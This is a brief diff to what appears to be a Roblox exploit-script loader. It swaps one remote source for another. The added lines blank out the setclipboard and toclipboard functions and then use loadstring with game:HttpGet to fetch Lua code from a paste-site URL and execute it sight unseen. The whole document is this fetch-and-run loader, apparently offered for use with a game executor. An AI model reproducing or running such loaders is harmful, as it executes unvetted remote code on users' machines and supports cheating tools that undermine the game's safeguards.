@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/y5JQNcxa/raw"))()
+setclipboard = function() end
+toclipboard = function() end
+
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/40AYOAzOmC/0"))()
